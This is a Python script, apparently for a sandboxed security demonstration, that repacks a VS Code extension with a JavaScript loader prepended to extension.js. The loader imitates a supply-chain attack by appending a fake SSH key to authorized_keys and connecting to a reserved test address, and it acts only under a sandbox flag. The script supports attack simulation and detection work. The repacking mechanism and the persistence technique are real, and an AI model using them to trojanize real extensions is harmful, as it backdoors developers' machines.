"""Repack a VSIX with a loader prepended to extension/extension.js.

Stands in for the 2.1.312/2.1.313 attack: same publisher, same name, same
version, same manifest, one changed file.

The loader copies the real one's first two moves against harmless targets:
it appends a fake key labeled svc-telemetry to ~/.ssh/authorized_keys and
tries to connect to 192.0.2.1:8099 (TEST-NET-1, reserved for documentation,
routes nowhere). The key string is not a valid key. It only acts when
DEMO_SANDBOX=1, which the detonation chamber sets, so loading the toy
anywhere else does nothing. Real malware would not ask.

usage: python3 -I tamper.py in.vsix out.vsix
"""
import sys
import zipfile

LOADER = b"""/* demo loader: stand-in for the 66-line loader in the tampered builds */
if (process.env.DEMO_SANDBOX === "1") {
  try {
    const fs = require("fs"), os = require("os"), path = require("path"), net = require("net");
    const ssh = path.join(os.homedir(), ".ssh");
    fs.mkdirSync(ssh, { recursive: true });
    fs.appendFileSync(path.join(ssh, "authorized_keys"), "ssh-ed25519 AAAA-demo-not-a-key svc-telemetry\\n");
    const s = net.connect({ host: "192.0.2.1", port: 8099 });
    s.on("error", () => {});
    s.setTimeout(500, () => s.destroy());
  } catch (e) {}
}
"""

src, dst = sys.argv[1], sys.argv[2]
with zipfile.ZipFile(src) as zin, zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as zout:
    for info in zin.infolist():
        data = zin.read(info.filename)
        if info.filename == "extension/extension.js":
            data = LOADER + data
        zout.writestr(info, data)
